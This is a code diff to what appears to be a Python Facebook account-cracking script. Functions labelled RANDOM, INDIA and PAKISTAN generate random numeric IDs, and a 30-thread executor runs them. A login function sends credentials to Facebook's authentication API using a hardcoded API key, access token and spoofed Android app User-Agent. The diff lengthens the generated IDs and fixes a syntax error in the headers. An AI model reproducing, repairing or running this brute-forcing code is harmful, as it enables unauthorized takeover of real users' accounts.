@@ -1193,7 +1193,7 @@ def RANDOM():
   else:
       mtd.append('m1')
   for nmbr in range(limit):
-    nmp = ''.join(random.choice(string.digits) for _ in range(5))
+    nmp = ''.join(random.choice(string.digits) for _ in range(6))
     user.append(nmp)
   with tred(max_workers=30) as king_xd:
     os.system('clear')
@@ -1241,7 +1241,7 @@ def INDIA():
   else:
       mtd.append('m1')
   for nmbr in range(limit):
-    nmp = ''.join(random.choice(string.digits) for _ in range(6))
+    nmp = ''.join(random.choice(string.digits) for _ in range(7))
     user.append(nmp)
   with tred(max_workers=30) as king_xd:
     os.system('clear')
@@ -1289,7 +1289,7 @@ def PAKISTAN():
   else:
       mtd.append('m1')
   for nmbr in range(limit):
-    nmp = ''.join(random.choice(string.digits) for _ in range(7))
+    nmp = ''.join(random.choice(string.digits) for _ in range(8))
     user.append(nmp)
   with tred(max_workers=30) as king_xd:
     os.system('clear')
@@ -1842,7 +1842,7 @@ def m7(ids,pwv):
             'fb_api_req_friendly_name':'authenticate',
             'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
             'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-            update={'User-Agent': "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VFD 600;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",,
+            update={'User-Agent': "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VFD 600;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
             'Accept-Encoding':'gzip, deflate',
             'Connection':'close',
             'Content-Type':'application/x-www-form-urlencoded',
